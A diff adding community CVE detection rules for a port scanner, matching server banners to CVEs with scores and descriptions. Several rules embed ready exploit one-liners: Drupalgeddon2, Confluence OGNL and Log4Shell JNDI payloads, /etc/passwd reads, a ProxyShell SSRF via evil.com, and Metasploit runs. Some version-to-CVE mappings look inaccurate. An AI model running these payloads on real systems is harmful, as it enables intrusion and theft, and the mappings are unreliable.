@@ -1,0 +1,595 @@
+# Community CVE detection rules — drop-in extension to the built-in set.
+# Loader: crates/portscan/src/cve.rs::load_community_rules
+#
+# Pattern matching: case-insensitive substring search against the raw
+# banner. Order: built-ins first, this file appended.
+#
+# Each [[rule]] requires: pattern, cve, cvss, severity, description.
+# `exploit` is optional; if set, `TARGET` is replaced at runtime.
+
+# ── Web servers / proxies ────────────────────────────────────────────────
+
+[[rule]]
+pattern = "apache/2.4.51"
+cve = "CVE-2021-42013"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.51 — patch for 41773/42013 incomplete in some configs."
+
+[[rule]]
+pattern = "apache/2.4.52"
+cve = "CVE-2022-22720"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.52 — HTTP request smuggling via mod_proxy_ajp."
+
+[[rule]]
+pattern = "apache/2.4.53"
+cve = "CVE-2022-22720"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.53 — HTTP request smuggling."
+
+[[rule]]
+pattern = "apache/2.4.54"
+cve = "CVE-2022-31813"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.54 — mod_proxy X-Forwarded-For removal allows SSRF."
+
+[[rule]]
+pattern = "apache/2.4.55"
+cve = "CVE-2023-25690"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.55 — mod_proxy HTTP request smuggling."
+
+[[rule]]
+pattern = "apache/2.4.56"
+cve = "CVE-2023-31122"
+cvss = 7.5
+severity = "high"
+description = "Apache 2.4.56 — mod_macro out-of-bounds read."
+
+[[rule]]
+pattern = "apache/2.4.57"
+cve = "CVE-2023-45802"
+cvss = 5.9
+severity = "medium"
+description = "Apache 2.4.57 — HTTP/2 stream memory not reclaimed on RST."
+
+[[rule]]
+pattern = "apache/2.4.58"
+cve = "CVE-2024-27316"
+cvss = 7.5
+severity = "high"
+description = "Apache 2.4.58 — HTTP/2 CONTINUATION flood DoS."
+
+[[rule]]
+pattern = "apache/2.4.59"
+cve = "CVE-2024-38476"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.59 — mod_rewrite SSRF and source disclosure."
+
+[[rule]]
+pattern = "apache/2.4.60"
+cve = "CVE-2024-39884"
+cvss = 7.5
+severity = "high"
+description = "Apache 2.4.60 — mod_rewrite encoded backreference SSRF."
+
+[[rule]]
+pattern = "apache/2.4.61"
+cve = "CVE-2024-40725"
+cvss = 5.3
+severity = "medium"
+description = "Apache 2.4.61 — incomplete fix for 39884 / source disclosure."
+
+[[rule]]
+pattern = "nginx/1.19."
+cve = "CVE-2021-23017"
+cvss = 7.7
+severity = "high"
+description = "nginx 1.19.x — DNS resolver heap overflow."
+
+[[rule]]
+pattern = "nginx/1.20."
+cve = "CVE-2021-23017"
+cvss = 7.7
+severity = "high"
+description = "nginx 1.20.x — DNS resolver heap overflow (pre-1.20.1)."
+
+[[rule]]
+pattern = "nginx/1.21."
+cve = "CVE-2022-41741"
+cvss = 7.0
+severity = "high"
+description = "nginx 1.21.x — mp4 module memory corruption."
+
+[[rule]]
+pattern = "nginx/1.22."
+cve = "CVE-2022-41742"
+cvss = 7.0
+severity = "high"
+description = "nginx 1.22.x — mp4 module memory corruption."
+
+[[rule]]
+pattern = "nginx/1.23."
+cve = "CVE-2024-7347"
+cvss = 4.2
+severity = "medium"
+description = "nginx 1.23.x — ngx_http_mp4_module out-of-bounds read."
+
+[[rule]]
+pattern = "nginx/1.24."
+cve = "CVE-2024-7347"
+cvss = 4.2
+severity = "medium"
+description = "nginx 1.24.x — ngx_http_mp4_module out-of-bounds read."
+
+[[rule]]
+pattern = "nginx/1.25.0"
+cve = "CVE-2024-24989"
+cvss = 7.5
+severity = "high"
+description = "nginx 1.25.0 — HTTP/3 ngx_http_v3_module crash via QUIC packet."
+
+[[rule]]
+pattern = "nginx/1.25.1"
+cve = "CVE-2024-24990"
+cvss = 7.5
+severity = "high"
+description = "nginx 1.25.1 — HTTP/3 ngx_http_v3_module memory exhaustion."
+
+# ── Web frameworks / apps ───────────────────────────────────────────────
+
+[[rule]]
+pattern = "wordpress/5.0"
+cve = "CVE-2019-8942"
+cvss = 8.8
+severity = "high"
+description = "WordPress 5.0 — image meta path traversal → RCE."
+
+[[rule]]
+pattern = "wordpress/4.7"
+cve = "CVE-2017-1001000"
+cvss = 9.8
+severity = "critical"
+description = "WordPress 4.7.0/4.7.1 — REST API content injection (mass defacement)."
+exploit = "curl -X POST 'http://TARGET/wp-json/wp/v2/posts/1?id=1abc' -H 'Content-Type: application/json' -d '{\"title\":\"pwned\"}'"
+
+[[rule]]
+pattern = "drupal/7."
+cve = "CVE-2018-7600"
+cvss = 9.8
+severity = "critical"
+description = "Drupal 7 (Drupalgeddon2) — unauthenticated RCE via form rendering."
+exploit = "curl 'http://TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id' --data 'form_id=user_pass&_triggering_element_name=name'"
+
+[[rule]]
+pattern = "drupal/8."
+cve = "CVE-2018-7600"
+cvss = 9.8
+severity = "critical"
+description = "Drupal 8 (Drupalgeddon2) — unauthenticated RCE."
+
+[[rule]]
+pattern = "joomla! 3.4"
+cve = "CVE-2015-8562"
+cvss = 9.8
+severity = "critical"
+description = "Joomla 3.4 — unauthenticated RCE via X-Forwarded-For session deserialization."
+
+[[rule]]
+pattern = "atlassian confluence"
+cve = "CVE-2022-26134"
+cvss = 9.8
+severity = "critical"
+description = "Confluence — unauthenticated OGNL injection RCE (actively exploited)."
+exploit = "curl 'http://TARGET/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/'"
+
+[[rule]]
+pattern = "jira"
+cve = "CVE-2022-0540"
+cvss = 9.9
+severity = "critical"
+description = "Jira Seraph — authentication bypass on first-party apps."
+
+[[rule]]
+pattern = "spring boot"
+cve = "CVE-2022-22965"
+cvss = 9.8
+severity = "critical"
+description = "Spring4Shell — JDK 9+ Spring MVC dataBinder RCE."
+exploit = "curl 'http://TARGET/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'"
+
+# ── App servers ──────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "tomcat/7."
+cve = "CVE-2017-12617"
+cvss = 8.1
+severity = "high"
+description = "Tomcat 7.x with PUT enabled — JSP upload RCE."
+
+[[rule]]
+pattern = "tomcat/8."
+cve = "CVE-2020-1938"
+cvss = 9.8
+severity = "critical"
+description = "Tomcat 8.x — Ghostcat AJP file inclusion / RCE."
+exploit = "ajpfuzzer cli\nconnect TARGET 8009\nforward /index.jsp"
+
+[[rule]]
+pattern = "tomcat/9."
+cve = "CVE-2020-1938"
+cvss = 9.8
+severity = "critical"
+description = "Tomcat 9.x — Ghostcat AJP file inclusion / RCE."
+
+[[rule]]
+pattern = "tomcat/10."
+cve = "CVE-2024-50379"
+cvss = 9.8
+severity = "critical"
+description = "Tomcat 10.x — JSP source disclosure via case-insensitive FS."
+
+[[rule]]
+pattern = "jetty/9."
+cve = "CVE-2023-26048"
+cvss = 5.3
+severity = "medium"
+description = "Jetty 9.x — multipart memory exhaustion DoS."
+
+[[rule]]
+pattern = "weblogic"
+cve = "CVE-2020-14882"
+cvss = 9.8
+severity = "critical"
+description = "Oracle WebLogic — unauth console RCE (actively exploited by Lazarus)."
+exploit = "curl 'http://TARGET:7001/console/css/%252e%252e%252fconsole.portal'"
+
+# ── Databases / caches / queues ─────────────────────────────────────────
+
+[[rule]]
+pattern = "memcached"
+cve = "CVE-2018-1000115"
+cvss = 7.5
+severity = "high"
+description = "memcached UDP — 50,000x amplification DDoS reflector."
+
+[[rule]]
+pattern = "rabbitmq"
+cve = "CVE-2019-11281"
+cvss = 8.8
+severity = "high"
+description = "RabbitMQ — XSS in management UI."
+
+[[rule]]
+pattern = "couchdb"
+cve = "CVE-2017-12635"
+cvss = 9.8
+severity = "critical"
+description = "CouchDB — JSON parser admin role escalation → RCE."
+
+[[rule]]
+pattern = "postgresql 9."
+cve = "CVE-2019-9193"
+cvss = 8.8
+severity = "high"
+description = "PostgreSQL 9.x with COPY FROM PROGRAM — superuser command exec."
+exploit = "psql -h TARGET -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id'\""
+
+[[rule]]
+pattern = "mssql"
+cve = "CVE-2020-0618"
+cvss = 8.5
+severity = "high"
+description = "MSSQL Reporting Services — auth code execution via XML deserialization."
+
+# ── Mail ─────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "sendmail 8."
+cve = "CVE-2003-0161"
+cvss = 9.8
+severity = "critical"
+description = "Sendmail 8.x (legacy) — prescan() integer overflow → RCE."
+
+[[rule]]
+pattern = "postfix 2."
+cve = "CVE-2011-1720"
+cvss = 7.5
+severity = "high"
+description = "Postfix 2.x — Cyrus SASL plugin heap overflow."
+
+# ── Network appliances / VPN / firewall ─────────────────────────────────
+
+[[rule]]
+pattern = "fortinet fortigate"
+cve = "CVE-2022-42475"
+cvss = 9.8
+severity = "critical"
+description = "FortiOS SSL-VPN — pre-auth heap overflow RCE (actively exploited)."
+
+[[rule]]
+pattern = "pulse secure"
+cve = "CVE-2019-11510"
+cvss = 10.0
+severity = "critical"
+description = "Pulse Secure SSL VPN — arbitrary file read (creds/sessions). REvil/Maze ransomware vector."
+exploit = "curl 'https://TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'"
+
+[[rule]]
+pattern = "citrix"
+cve = "CVE-2019-19781"
+cvss = 9.8
+severity = "critical"
+description = "Citrix Netscaler ADC — directory traversal → unauthenticated RCE (Shitrix)."
+exploit = "curl 'https://TARGET/vpn/../vpns/cfg/smb.conf'"
+
+[[rule]]
+pattern = "cisco asa"
+cve = "CVE-2018-0101"
+cvss = 10.0
+severity = "critical"
+description = "Cisco ASA WebVPN — pre-auth XML parser double-free RCE."
+
+[[rule]]
+pattern = "cisco ios"
+cve = "CVE-2017-3881"
+cvss = 9.8
+severity = "critical"
+description = "Cisco IOS Cluster Management Protocol (CMP) — telnet RCE."
+
+[[rule]]
+pattern = "f5 big-ip"
+cve = "CVE-2020-5902"
+cvss = 9.8
+severity = "critical"
+description = "F5 BIG-IP TMUI — RCE via traffic management UI (actively exploited)."
+exploit = "curl 'https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=show%20sys%20version'"
+
+# ── Mail / Exchange ──────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "exchange"
+cve = "CVE-2021-26855"
+cvss = 9.8
+severity = "critical"
+description = "Microsoft Exchange — ProxyLogon SSRF chain → RCE (Hafnium APT)."
+
+[[rule]]
+pattern = "owa"
+cve = "CVE-2021-34473"
+cvss = 9.8
+severity = "critical"
+description = "Microsoft Exchange OWA — ProxyShell pre-auth RCE."
+exploit = "curl 'https://TARGET/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com' -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=evil.com/EWS/Exchange.asmx?a=~123'"
+
+# ── DNS / time / management ─────────────────────────────────────────────
+
+[[rule]]
+pattern = "bind 9.10"
+cve = "CVE-2017-3145"
+cvss = 7.5
+severity = "high"
+description = "BIND 9.10 — use-after-free in resolver assertion failure → DoS."
+
+[[rule]]
+pattern = "bind 9.11"
+cve = "CVE-2020-8617"
+cvss = 7.5
+severity = "high"
+description = "BIND 9.11 — TSIG verification crash, remote DoS."
+
+[[rule]]
+pattern = "snmpd"
+cve = "CVE-2002-0012"
+cvss = 7.5
+severity = "high"
+description = "Net-SNMP — multiple unauthenticated DoS via crafted community packet (legacy)."
+
+[[rule]]
+pattern = "samba"
+cve = "CVE-2017-7494"
+cvss = 9.8
+severity = "critical"
+description = "Samba — SambaCry: writable share + crafted shared library → RCE (WannaCry-class vector)."
+exploit = "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOSTS TARGET; run'"
+
+[[rule]]
+pattern = "openvpn"
+cve = "CVE-2022-0547"
+cvss = 9.1
+severity = "critical"
+description = "OpenVPN ≤2.5.5 — auth-token verification bypass, multi-factor bypass."
+
+# ── Hypervisors / virtualization ────────────────────────────────────────
+
+[[rule]]
+pattern = "vmware esxi"
+cve = "CVE-2021-21974"
+cvss = 8.8
+severity = "high"
+description = "VMware ESXi OpenSLP heap overflow → RCE (ESXiArgs ransomware vector)."
+exploit = "msfconsole -q -x 'use exploit/multi/vmware/openslp_heap_overflow; set RHOSTS TARGET; run'"
+
+[[rule]]
+pattern = "vcenter"
+cve = "CVE-2021-21985"
+cvss = 9.8
+severity = "critical"
+description = "VMware vCenter vSphere Client — unauthenticated RCE via Virtual SAN Health Check plugin."
+
+# ── Container / orchestration ──────────────────────────────────────────
+
+[[rule]]
+pattern = "docker"
+cve = "CVE-2019-5736"
+cvss = 7.6
+severity = "high"
+description = "runc — host root escape via /proc/self/exe overwrite from a malicious container."
+
+[[rule]]
+pattern = "kubernetes"
+cve = "CVE-2018-1002105"
+cvss = 9.8
+severity = "critical"
+description = "Kubernetes API server — privilege escalation via aggregated API exec channel."
+
+# ── PHP runtimes ────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "php/5.6"
+cve = "CVE-2019-11043"
+cvss = 9.8
+severity = "critical"
+description = "PHP 5.6 + nginx fastcgi — env var injection → RCE."
+exploit = "phuip-fpizdam github.com/neex/phuip-fpizdam"
+
+[[rule]]
+pattern = "php/7.0"
+cve = "CVE-2019-11043"
+cvss = 9.8
+severity = "critical"
+description = "PHP 7.0 + nginx fastcgi — env var injection → RCE."
+
+[[rule]]
+pattern = "php/7.1"
+cve = "CVE-2019-11043"
+cvss = 9.8
+severity = "critical"
+description = "PHP 7.1 + nginx fastcgi — env var injection → RCE."
+
+[[rule]]
+pattern = "php/7.2"
+cve = "CVE-2019-11043"
+cvss = 9.8
+severity = "critical"
+description = "PHP 7.2 + nginx fastcgi — env var injection → RCE."
+
+# ── Java app frameworks ────────────────────────────────────────────────
+
+[[rule]]
+pattern = "jboss"
+cve = "CVE-2017-12149"
+cvss = 9.8
+severity = "critical"
+description = "JBoss Application Server — JMXInvokerServlet deserialization RCE."
+
+[[rule]]
+pattern = "wildfly"
+cve = "CVE-2017-12149"
+cvss = 9.8
+severity = "critical"
+description = "WildFly — JMXInvokerServlet deserialization RCE."
+
+[[rule]]
+pattern = "log4j"
+cve = "CVE-2021-44228"
+cvss = 10.0
+severity = "critical"
+description = "Log4Shell — JNDI lookup in log message → unauthenticated RCE on log4j 2.0-2.14.x."
+exploit = "curl 'http://TARGET/' -H 'User-Agent: ${jndi:ldap://attacker.example.com/a}'"
+
+[[rule]]
+pattern = "spring framework"
+cve = "CVE-2022-22963"
+cvss = 9.8
+severity = "critical"
+description = "Spring Cloud Function — SpEL injection RCE via routing-expression header."
+
+# ── Mail / messaging legacy ────────────────────────────────────────────
+
+[[rule]]
+pattern = "dovecot"
+cve = "CVE-2024-23184"
+cvss = 7.5
+severity = "high"
+description = "Dovecot ≤2.3.21 — unbounded MIME parts memory exhaustion."
+
+# ── CMS / control panels ────────────────────────────────────────────────
+
+[[rule]]
+pattern = "magento"
+cve = "CVE-2022-24086"
+cvss = 9.8
+severity = "critical"
+description = "Magento 2 — unauthenticated RCE via crafted email template."
+
+[[rule]]
+pattern = "cpanel"
+cve = "CVE-2023-29489"
+cvss = 6.1
+severity = "medium"
+description = "cPanel WHM — reflected XSS in webmail login portal."
+
+[[rule]]
+pattern = "phpmyadmin"
+cve = "CVE-2018-12613"
+cvss = 8.8
+severity = "high"
+description = "phpMyAdmin 4.8.0 — file inclusion via crafted target parameter."
+
+# ── Industrial / IoT ────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "lighttpd/1.4"
+cve = "CVE-2022-22707"
+cvss = 5.3
+severity = "medium"
+description = "lighttpd 1.4.x — out-of-bounds read in mod_extforward."
+
+[[rule]]
+pattern = "miniserv/1."
+cve = "CVE-2019-15107"
+cvss = 9.8
+severity = "critical"
+description = "Webmin (miniserv 1.x) — unauth RCE via password change."
+
+[[rule]]
+pattern = "tp-link"
+cve = "CVE-2017-13772"
+cvss = 9.8
+severity = "critical"
+description = "TP-Link router httpd — pre-auth RCE via crafted POST."
+
+# ── Misc / 2024-2025 high-impact ───────────────────────────────────────
+
+[[rule]]
+pattern = "rsync"
+cve = "CVE-2024-12084"
+cvss = 9.8
+severity = "critical"
+description = "rsync ≤3.3.0 — heap buffer overflow in checksum length leading to RCE."
+
+[[rule]]
+pattern = "openssh_9.6"
+cve = "CVE-2024-6387"
+cvss = 8.1
+severity = "high"
+description = "regreSSHion: OpenSSH 8.5p1-9.7p1 race condition in SIGALRM handler → RCE as root."
+
+[[rule]]
+pattern = "openssh_9.7"
+cve = "CVE-2024-6387"
+cvss = 8.1
+severity = "high"
+description = "regreSSHion: OpenSSH 9.7 race condition in SIGALRM handler → RCE."
+
+[[rule]]
+pattern = "gitlab"
+cve = "CVE-2023-7028"
+cvss = 10.0
+severity = "critical"
+description = "GitLab CE/EE — account takeover via password reset to attacker email."
+
+[[rule]]
+pattern = "jenkins"
+cve = "CVE-2024-23897"
+cvss = 9.8
+severity = "critical"
+description = "Jenkins CLI args4j — arbitrary file read via @-prefix → RCE chain."
+exploit = "java -jar jenkins-cli.jar -s http://TARGET/ -webSocket help '@/etc/passwd'"
